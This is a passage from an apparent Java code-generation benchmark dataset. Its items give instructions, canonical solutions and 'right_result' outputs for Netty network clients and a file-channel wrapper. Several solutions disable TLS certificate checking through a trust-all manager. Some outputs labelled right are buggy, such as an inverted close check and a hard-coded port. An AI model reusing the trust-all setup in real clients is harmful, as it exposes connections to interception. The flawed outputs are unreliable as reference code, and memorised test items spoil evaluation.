    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.Path;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        this.mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return this.mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (this.fileChannel != null) {\n            this.fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() {\n        if (this.mappedBuffer != null) {\n            this.mappedBuffer.force();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null && !fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() throws IOException {\n        // This method does nothing as the buffer is read-only\n    }\n}\n```"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, calculate factorials, and handle secure connections when required.\n\nClass Description: The FactorialClient class establishes a TCP connection to a specified server using Netty's non-blocking I/O. It supports optional SSL encryption and calculates factorials through server communication. The class manages connection lifecycle and resource cleanup.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes the Netty client, establishes connection, handles SSL if enabled, and calculates factorial. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints factorial result to stderr)\n  - Description: Creates event loop group, configures bootstrap with channel type and handler, connects to server, retrieves factorial result from handler, and ensures proper resource cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx = SSL ? SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE) : null;\n        EventLoopGroup group = new NioEventLoopGroup();\n        \n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            FactorialClientHandler handler = (FactorialClientHandler) f.channel().pipeline().last();\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class FactorialClient {\n    private final boolean SSL;\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8322;\n    private static final int COUNT = 1000;\n\n    public FactorialClient(boolean ssl) {\n        this.SSL = ssl;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            ChannelHandler[] handlers = {new StringDecoder(), new StringEncoder()};\n            if (SSL) {\n                SslContext sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                handlers = prepend(sslCtx.newHandler(b.alloc()), handlers);\n            }\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    for (ChannelHandler h : handlers) {\n                        p.addLast(h);\n                    }\n                    p.addLast(new FactorialClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().writeAndFlush(String.valueOf(COUNT)).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private ChannelHandler[] prepend(ChannelHandler first, ChannelHandler... rest) {\n        ChannelHandler[] array = new ChannelHandler[rest.length + 1];\n        array[0] = first;\n        System.arraycopy(rest, 0, array, 1, rest.length);\n        return array;\n    }\n\n    public static void main(String[] args) {\n        boolean ssl = false; // Change to true if SSL is needed\n        try {\n            new FactorialClient(ssl).start();\n        } catch (Exception e) {\n            e.printStackTrace(System.err);\n        }\n    }\n}\n\nclass FactorialClientHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.err.println(\"Factorial of \" + FactorialClient.COUNT + \" is: \" + msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace(System.err);\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for RPC communication, handling connection management, message sending, and resource cleanup.\n\nClass Description: NettyConnectClient is a TCP client implementation using Netty framework for RPC communication. It manages network connections, handles message encoding/decoding, and provides methods for connection validation and resource cleanup.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads and event processing\n- channel: [Channel] - Represents the active network connection to the server\n\nMethods:\n- init: [void]([String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory]) -> [void] - Initializes the client connection, sets up the pipeline with encoders/decoders, and establishes connection to the server\n- isValidate: [void]() -> [boolean] - Checks if the current connection is active and valid\n- close: [void]() -> [void] - Closes the active connection and releases all resources\n- send: [void]([XxlRpcRequest xxlRpcRequest]) -> [void] - Sends an RPC request through the established channel",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyDecoder;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyEncoder;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport com.wugui.datax.rpc.util.IpUtil;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyConnectClient thisClient = this;\n\n        Object[] array = IpUtil.parseIpPort(address);\n        String host = (String) array[0];\n        int port = (int) array[1];\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new NettyEncoder(XxlRpcRequest.class, serializer))\n                                .addLast(new NettyDecoder(XxlRpcResponse.class, serializer))\n                                .addLast(new NettyClientHandler(xxlRpcInvokerFactory, thisClient));\n                    }\n                })\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        this.channel.writeAndFlush(xxlRpcRequest).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class NettyConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        // Add encoders/decoders here based on the serializer\n                        pipeline.addLast(new ObjectEncoder());\n                        pipeline.addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                        pipeline.addLast(new NettyClientHandler(serializer, xxlRpcInvokerFactory));\n                    }\n                });\n        channel = bootstrap.connect(address, 8080).sync().channel();\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        if (isValidate()) {\n            channel.writeAndFlush(xxlRpcRequest);\n        } else {\n            throw new IllegalStateException(\"Connection is not active\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections, sending messages to a server, and handling console input.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, read console input, and gracefully shutdown the connection. It uses Netty's non-blocking I/O model for efficient network communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void]() -> [void] - Initializes the Netty client, connects to the specified server, and sets up the communication pipeline\n- sendMessage(): [void]([String message]) -> [void] - Converts the input string to a ByteBuf and sends it to the server through the established channel\n- startConsoleInput(): [void]() -> [void] - Starts reading input from the console and sends each line to the server (throws IOException)\n- shutdown(): [void]() -> [void] - Gracefully shuts down the client connection and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientChannelInitializer());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class EchoClient {\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) throws Exception {\n                             System.out.println(\"Received: \" + msg.toString(io.netty.util.CharsetUtil.UTF_8));\n                         }\n                     });\n                 }\n             });\n\n            channel = b.connect(hostName, portNumber).sync().channel();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel != null && channel.isActive()) {\n            ByteBuf buf = Unpooled.copiedBuffer(message, io.netty.util.CharsetUtil.UTF_8);\n            channel.writeAndFlush(buf);\n        }\n    }\n\n    public void startConsoleInput() throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sendMessage(line);\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + EchoClient.class.getSimpleName() + \" <hostname> <port>\");\n            return;\n        }\n\n        String hostName = args[0];\n        int portNumber = Integer.parseInt(args[1]);\n\n        EchoClient client = new EchoClient(hostName, portNumber);\n        client.connect();\n        client.startConsoleInput();\n        client.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Implement a Netty-based RPC client in Java that handles remote procedure calls, manages connections, and processes responses asynchronously.\n\nClass Description: NettyRpcClient is a final class that implements RpcRequestTransport interface. It provides functionality for establishing TCP connections using Netty framework, sending RPC requests, and managing client-side communication with a remote server. The class handles connection pooling, request tracking, and graceful shutdown.\n\nAttributes:\n- serviceDiscovery: [ServiceDiscovery] - Handles service lookup to find the appropriate server address\n- unprocessedRequests: [UnprocessedRequests] - Tracks outstanding RPC requests and their corresponding futures\n- channelProvider: [ChannelProvider] - Manages and provides channels for communication\n- bootstrap: [Bootstrap] - Netty's client bootstrap configuration\n- eventLoopGroup: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRpcClient() -> [void] - Constructor that initializes the Netty client configuration, including event loop group, bootstrap, and pipeline handlers\n- doConnect(InetSocketAddress inetSocketAddress) -> [Channel] - Establishes a connection to the specified remote address and returns the channel\n- sendRpcRequest(RpcRequest rpcRequest) -> [Object] - Sends an RPC request to the server and returns a CompletableFuture containing the response\n- getChannel(InetSocketAddress inetSocketAddress) -> [Channel] - Retrieves or creates a channel for the specified address\n- close() -> [void] - Shuts down the client gracefully and releases resources",
    "Canonical_solution": "import github.javaguide.enums.CompressTypeEnum;\nimport github.javaguide.enums.SerializationTypeEnum;\nimport github.javaguide.enums.ServiceDiscoveryEnum;\nimport github.javaguide.extension.ExtensionLoader;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.registry.ServiceDiscovery;\nimport github.javaguide.remoting.constants.RpcConstants;\nimport github.javaguide.remoting.dto.RpcMessage;\nimport github.javaguide.remoting.dto.RpcRequest;\nimport github.javaguide.remoting.dto.RpcResponse;\nimport github.javaguide.remoting.transport.RpcRequestTransport;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        eventLoopGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        p.addLast(new IdleStateHandler(0, 5, 0, TimeUnit.SECONDS));\n                        p.addLast(new RpcMessageEncoder());\n                        p.addLast(new RpcMessageDecoder());\n                        p.addLast(new NettyRpcClientHandler());\n                    }\n                });\n        this.serviceDiscovery = ExtensionLoader.getExtensionLoader(ServiceDiscovery.class).getExtension(ServiceDiscoveryEnum.ZK.getName());\n        this.unprocessedRequests = SingletonFactory.getInstance(UnprocessedRequests.class);\n        this.channelProvider = SingletonFactory.getInstance(ChannelProvider.class);\n    }\n\n    public Channel doConnect(InetSocketAddress inetSocketAddress) {\n        CompletableFuture<Channel> completableFuture = new CompletableFuture<>();\n        bootstrap.connect(inetSocketAddress).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                completableFuture.complete(future.channel());\n            } else {\n                throw new IllegalStateException();\n            }\n        });\n        return completableFuture.get();\n    }\n\n    @Override\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        CompletableFuture<RpcResponse<Object>> resultFuture = new CompletableFuture<>();\n        InetSocketAddress inetSocketAddress = serviceDiscovery.lookupService(rpcRequest);\n        Channel channel = getChannel(inetSocketAddress);\n        if (channel.isActive()) {\n            unprocessedRequests.put(rpcRequest.getRequestId(), resultFuture);\n            RpcMessage rpcMessage = RpcMessage.builder().data(rpcRequest)\n                    .codec(SerializationTypeEnum.HESSIAN.getCode())\n                    .compress(CompressTypeEnum.GZIP.getCode())\n                    .messageType(RpcConstants.REQUEST_TYPE).build();\n            channel.writeAndFlush(rpcMessage).addListener((ChannelFutureListener) future -> {\n                if (future.isSuccess()) {\n                } else {\n                    future.channel().close();\n                    resultFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            throw new IllegalStateException();\n        }\n        return resultFuture;\n    }\n\n    public Channel getChannel(InetSocketAddress inetSocketAddress) {\n        Channel channel = channelProvider.get(inetSocketAddress);\n        if (channel == null) {\n            channel = doConnect(inetSocketAddress);\n            channelProvider.set(inetSocketAddress, channel);\n        }\n        return channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic final class NettyRpcClient implements RpcRequestTransport {\n    private ServiceDiscovery serviceDiscovery;\n    private UnprocessedRequests unprocessedRequests;\n    private ChannelProvider channelProvider;\n    private Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap()\n                .group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    private Channel doConnect(InetSocketAddress inetSocketAddress) throws Exception {\n        return bootstrap.connect(inetSocketAddress).sync().channel();\n    }\n\n    @Override\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        InetSocketAddress address = serviceDiscovery.lookup(rpcRequest.getServiceName());\n        Channel channel = getChannel(address);\n        CompletableFuture<Object> future = new CompletableFuture<>();\n        unprocessedRequests.add(rpcRequest.getRequestId(), future);\n        channel.writeAndFlush(rpcRequest).addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                // Request sent successfully\n            } else {\n                future.completeExceptionally(f.cause());\n            }\n        });\n        return future;\n    }\n\n    private Channel getChannel(InetSocketAddress inetSocketAddress) {\n        return channelProvider.getOrCreateChannel(inetSocketAddress, () -> {\n            try {\n                return doConnect(inetSocketAddress);\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to connect to \" + inetSocketAddress, e);\n            }\n        });\n    }\n\n    @Override\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n        channelProvider.closeAllChannels();\n    }\n}\n```"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Implement a Netty-based WebSocket client class that establishes and manages WebSocket connections, handles message sending/receiving, and provides connection status monitoring.\n\nClass Description: NettyWebSocket is a WebSocket client implementation using Netty framework that supports both WS and WSS protocols. It implements the ITransport interface for WebSocket communication, providing connection management, message transmission, and status checking capabilities.\n\nAttributes:\n- mChannel: Channel - The active Netty channel for WebSocket communication\n- mHandler: NettyWebSocketClientHandler - Custom handler for WebSocket events and messages\n- mGroup: NioEventLoopGroup - Netty event loop group for I/O operations\n- mUri: String - The WebSocket server URI to connect to\n- mOptions: WebSocketOptions - Configuration options for the WebSocket connection\n\nMethods:\n- connect(ITransportHandler transportHandler, TransportOptions options) -> void - Establishes a WebSocket connection to the specified URI. Initializes SSL context if needed, creates a handshaker, and sets up the Netty pipeline with necessary handlers.\n  Input: \n    - transportHandler: ITransportHandler - Callback handler for transport events\n    - options: TransportOptions - Connection-specific options\n  Output: None (throws Exception on failure)\n\n- send(byte[] payload, boolean isBinary) -> void - Sends data through the WebSocket connection as either binary or text frame.\n  Input:\n    - payload: byte[] - The data to send\n    - isBinary: boolean - Flag indicating binary (true) or text (false) format\n  Output: None\n\n- isOpen() -> boolean - Checks if the WebSocket connection is currently active.\n  Input: None\n  Output: boolean - True if connection is open, false otherwise\n\n- close() -> void - Closes the WebSocket connection gracefully and releases resources.\n  Input: None\n  Output: None (throws Exception on failure)\n\n- validateURIAndGetPort(URI uri) -> int - Validates the WebSocket URI and determines the appropriate port.\n  Input: uri: URI - The WebSocket URI to validate\n  Output: int - The port number to use\n\n- getSSLContext(String scheme) -> SslContext - Creates SSL context for WSS connections.\n  Input: scheme: String - The URI scheme (\"ws\" or \"wss\")\n  Output: SslContext - Configured SSL context or null for WS\n\n- toByteBuf(byte[] bytes) -> ByteBuf - Converts byte array to Netty ByteBuf.\n  Input: bytes: byte[] - Data to convert\n  Output: ByteBuf - Netty buffer containing the data",
    "Canonical_solution": "import java.net.URI;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.net.ssl.SSLException;\n\nimport io.crossbar.autobahn.wamp.interfaces.ITransport;\nimport io.crossbar.autobahn.wamp.interfaces.ITransportHandler;\nimport io.crossbar.autobahn.wamp.types.CloseDetails;\nimport io.crossbar.autobahn.wamp.types.TransportOptions;\nimport io.crossbar.autobahn.wamp.types.WebSocketOptions;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class NettyWebSocket implements ITransport {\n\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private final String mUri;\n    private WebSocketOptions mOptions;\n\n    public NettyWebSocket(String uri, WebSocketOptions options) {\n        mUri = uri;\n        mOptions = options != null ? options : new WebSocketOptions();\n    }\n\n    @Override\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        if (options == null) {\n            options = new TransportOptions();\n            options.setAutoPingInterval(mOptions.getAutoPingInterval());\n            options.setAutoPingTimeout(mOptions.getAutoPingTimeout());\n            options.setMaxFramePayloadSize(mOptions.getMaxFramePayloadSize());\n        }\n\n        URI uri = new URI(mUri);\n        int port = validateURIAndGetPort(uri);\n        String scheme = uri.getScheme();\n        String host = uri.getHost();\n\n        final SslContext sslContext = getSSLContext(scheme);\n\n        WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                uri, WebSocketVersion.V13, null, true,\n                new DefaultHttpHeaders(), options.getMaxFramePayloadSize());\n        mHandler = new NettyWebSocketClientHandler(handshaker, this, transportHandler);\n\n        mGroup = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                   